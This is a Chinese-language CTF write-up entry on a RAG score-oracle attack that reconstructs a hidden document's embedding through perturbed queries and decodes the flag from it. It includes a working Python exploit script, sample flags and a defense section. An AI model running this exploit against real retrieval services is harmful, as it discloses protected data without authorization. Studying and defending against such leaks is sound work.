---
id: ai-security-rag-security-leaky-score-oracle-embedding-reconstruction
title: LeakyRAG 分数预言机：归一化点积微扰逐坐标恢复嵌入向量
type: scenario
domain: ai-security
path: ai-security/rag-security
technique: leaky-rag-score-oracle-embedding-reconstruction
aliases:
- LeakyRAG
- 分数预言机
- 归一化点积泄露
- 逐坐标恢复 embedding
- RAG 分数侧信道
- 向量检索信息泄露
tags:
- rag
- embedding
- score-oracle
- information-disclosure
- normalization
- vector-search
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:56:25+08:00'
  notes: 已对照原文 §LeakyRAG 核对：score=dot(normalize(query),doc)、flag_doc 仅隐藏 snippet、锚点+微扰 f_i=(y_i*norm-b)/t、解码 log(v[i]/v[63])*64+128、两个实例 flag 均一致；未本机复跑。
---

## 一句话结论

搜索接口对受保护文档只隐藏 `snippet`，却仍返回 `doc_id` 和 `score`；攻击者可以先选一个已知锚点向量 `a` 让 flag 文档进入 top-k，再查询 `a + t*e_i`，利用服务端归一化后的分数 `y_i = ((a+t e_i)/||a+t e_i||)·f` 反解出 `f_i`，遍历 64 个坐标后重建完整嵌入并解码出 flag。

## 原理

- 服务端对每个文档计算 `score = dot(vec, doc["vector"])`，对 flag 文档只隐藏文本，不隐藏 `doc_id` 与 `score`。因此 `flag_doc.score` 是一个关于查询向量 `q` 的线性函数 `q·f`（在归一化之前）。
- 攻击者不知道 `f`，但可以选择查询向量。先用一个锚点 `a`（例如 `NepCTF{aaaa...}` 的 embedding）得到基线 `b = a·f`，并确保 flag 文档出现在 top-k。
- 查询 `q = a + t*e_i`，服务端先归一化 `q`：`q' = (a + t e_i)/||a + t e_i||`，返回 `y_i = q'·f`。
- 因此 `f_i = (y_i * ||a + t e_i|| - b) / t`。`||a + t e_i|| = sqrt(1 + t^2 + 2t a_i)`（假设 `a` 已归一化）。
- 对 `i=0..63` 重复，得到完整 `f`；归一化后按公开的 embedding 编码规则解码字符：`v[i]/v[63] = exp((char_i - 128)/64)`，即 `char_i = round(log(v[i]/v[63])*64 + 128)`。
- 为避免数值误差/查询失败，可尝试多个 `t`（0.2、0.1、0.05、0.02、0.01），并用重建向量再次查询验证分数是否接近 1.0。

## 触发条件

- RAG 检索接口返回每个结果的 `doc_id` 和 `score`，即使隐藏了 `snippet`/正文。
- 攻击者可控制查询向量（直接提交向量，或能构造对应文本的 embedding）。
- 服务端对查询向量做确定性归一化，且没有噪声/限流/分数截断。
- embedding 编码规则公开或可推断（案例为 `exp((char-128)/64)` 归一化）。

## 利用步骤

1. 阅读源码，确认 `score = dot(normalize(query), doc_vector)`、受保护文档仍返回 `doc_id` 与 `score`、embedding 编码规则。
2. 构造锚点文本（如 `NepCTF{aaaa-...}`），计算其 embedding `a`，查询得到 flag 文档基线分数 `b` 与排名。
3. 对每个坐标 `i`，查询 `a + t*e_i`，记录返回的 `y_i`；若 flag 文档不在 top-k，调大 top_k 或换锚点。
4. 按 `f_i = (y_i*sqrt(1+t^2+2t*a_i) - b)/t` 计算 `f_i`，得到完整向量并归一化。
5. 按 `char_i = round(log(f[i]/f[63])*64 + 128)` 解码可打印字符，拼出 flag。
6. 用重建的 embedding 再查询一次，验证分数接近 1.0 / flag 文档排名第一。

## PoC

```python
import math
import numpy as np
import requests

DIM = 64
def embed(text: str) -> np.ndarray:
    data = text.encode()
    v = np.ones(DIM)
    for i, b in enumerate(data[:DIM-1]):
        v[i] = np.exp((b - 128) / 64.0)
    return v / np.linalg.norm(v)

def search(vec, top_k=20):
    r = requests.post(TARGET + "/api/search",
        json={"vector": [float(x) for x in vec], "top_k": top_k}, timeout=15)
    return r.json()["results"]

def flag_score(vec):
    for item in search(vec):
        if item["doc_id"] == "flag_doc":
            return item["score"]
    return None

anchor = embed("NepCTF{aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa}")
b = flag_score(anchor)

for t in [0.2, 0.1, 0.05, 0.02, 0.01]:
    recovered = np.zeros(DIM)
    ok = True
    for i in range(DIM):
        q = anchor.copy()
        q[i] += t
        y = flag_score(q)
        if y is None:
            ok = False
            break
        norm = math.sqrt(1 + t*t + 2*t*anchor[i])
        recovered[i] = (y * norm - b) / t
    if not ok:
        continue
    recovered /= np.linalg.norm(recovered)
    out = []
    for i in range(DIM - 1):
        code = int(round(np.log(recovered[i] / recovered[-1]) * 64 + 128))
        if 32 <= code <= 126:
            out.append(chr(code))
        else:
            break
    print("".join(out))
    break
```

案例输出：`NepCTF{f2fad3ec-be45-59ef-f914-026371caafac}`（另一实例为 `NepCTF{9f43ad65-21b6-276c-b938-8c0b32723e2e}`）。

## 变体与关联

- 变体：服务端不归一化查询时，直接 `f_i = (score(a+t e_i) - b)/t`，更简单。
- 变体：只返回 top-k 且 flag 文档不稳定出现时，换多个锚点/增大 top_k/降低 t，确保目标文档在结果中。
- 变体：embedding 编码不同（如直接字节、Base64、哈希）时，按公开编码规则替换解码步骤。
- 关联：[[ai-security-rag-security-blind-rag-matrix-mask-cpa-vector-recovery]]（矩阵掩码 CPA）、[[ai-security-rag-security-embedding-inversion-leaked-vector-store]]（向量库反演）、[[ai-security-rag-security-chromadb-unauth-knowledge-base-poisoning]]（向量库未授权）。

## 检测与防御

- 防御：对受保护文档不要返回 `score`/`doc_id`，或只返回分桶/加噪后的排名；隐藏结果应完全从 top-k 中移除。
- 防御：对查询向量加差分隐私噪声、限制同一来源的查询次数与坐标稀疏性；不要暴露确定性 embedding 编码。
- 防御：文档向量与正文使用独立密钥加密，key 不由向量派生；对 RAG 检索接口做鉴权与速率限制。
- 检测：大量 `a + t e_i` 形式的微调查询、同一文档分数被反复探测、查询向量接近单位基/锚点；检索日志异常。
- 响应：发现泄露后轮换向量/密钥、限制分数返回、审计被探测文档并通知数据所有者。
